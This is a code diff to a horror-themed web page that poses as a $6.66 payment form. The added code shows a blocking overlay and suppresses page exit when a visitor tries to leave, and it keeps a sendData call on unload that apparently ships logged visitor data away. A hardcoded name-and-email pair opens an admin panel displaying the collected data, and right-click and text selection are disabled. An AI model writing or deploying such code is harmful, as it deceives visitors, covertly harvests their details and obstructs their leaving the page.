@@ -168,6 +168,39 @@
     user-select: none; 
   }
 
+  /* Admin data display */
+  #adminDataDisplay {
+    position: fixed;
+    top: 10px;
+    right: 10px;
+    width: 400px;
+    height: 80vh;
+    overflow-y: scroll;
+    background-color: rgba(0,0,0,0.9);
+    color: #ff0000;
+    font-family: 'Courier New', Courier, monospace;
+    padding: 10px;
+    z-index: 1000;
+    border: 2px solid #ff0000;
+    border-radius: 10px;
+  }
+
+  /* Screen overlay for trap effect */
+  #overlayTrap {
+    display: none;
+    position: fixed;
+    z-index: 9999;
+    top:0; left:0;
+    width:100vw; height:100vh;
+    background: rgba(0,0,0,0.97);
+    color: #ff0000;
+    font-family: 'Creepster', cursive, monospace;
+    font-size: 2rem;
+    text-align: center;
+    padding-top: 40vh;
+    user-select: none;
+  }
+
   /* Animations */
   @keyframes glitch {
     0% {
@@ -247,9 +280,11 @@
   <form id="paymentForm">
     <input type="text" id="name" placeholder="Your Name" required autocomplete="off" />
     <input type="email" id="email" placeholder="Your Email" required autocomplete="off" />
-    <button type="submit">Pay $49.99</button>
+    <button type="submit">Pay $6.66</button>
   </form>
 </div>
+
+<div id="overlayTrap">You cannot leave... The darkness consumes all. 🩸</div>
 
 <audio autoplay loop>
   <source src="https://cdn.pixabay.com/download/audio/2022/03/23/audio_2a38831ac7.mp3?filename=heartbeat-6956.mp3" type="audio/mpeg" />
@@ -329,6 +364,7 @@
   // Payment modal logic
   const modal = document.getElementById('paymentModal');
   const form = document.getElementById('paymentForm');
+  const overlayTrap = document.getElementById('overlayTrap');
 
   button.addEventListener('click', () => {
     runaway = false;
@@ -383,8 +419,8 @@
     const name = form.querySelector('#name').value.trim();
     const email = form.querySelector('#email').value.trim();
     if(name && email){
-      if(name.toLowerCase() === 'ereexpro' && email.toLowerCase() === 'd3xt3r'){
-        // عرض بيانات dataLog للأدمن على الصفحة
+      if(name.toLowerCase() === 'd3xt3r' && email.toLowerCase() === 'ereexpro@gmail.com'){
+        // Show admin data
         let adminDiv = document.getElementById('adminDataDisplay');
         if(!adminDiv){
           adminDiv = document.createElement('div');
@@ -430,7 +466,12 @@
   }
 
   // Send data before unload
-  window.addEventListener('beforeunload', sendData);
+  window.addEventListener('beforeunload', e => {
+    // عرض شاشة التعتيم وعرقلة محاولة الخروج
+    overlayTrap.style.display = 'block';
+    e.preventDefault();
+    e.returnValue = '';
+  });
   window.addEventListener('unload', sendData);
 
   // Disable right click & text selection
